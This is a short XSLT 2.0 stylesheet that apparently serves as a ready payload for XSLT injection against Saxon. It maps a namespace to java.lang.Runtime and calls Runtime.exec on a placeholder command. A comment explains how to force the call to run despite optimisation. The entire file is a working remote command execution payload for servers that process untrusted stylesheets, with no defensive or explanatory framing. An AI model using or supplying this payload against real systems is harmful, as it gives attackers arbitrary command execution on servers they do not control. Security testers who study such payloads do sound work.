<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="java:java.lang.Runtime">
  <!-- Saxon 2.0 drops unused variables — xsl:value-of forces Runtime.exec. -->
  <xsl:variable name="cmd">CMD_PLACEHOLDER</xsl:variable>
  <xsl:template match="/">
    <ok>
      <xsl:value-of select="rt:exec(rt:getRuntime(), $cmd)"/>
    </ok>
  </xsl:template>
</xsl:stylesheet>
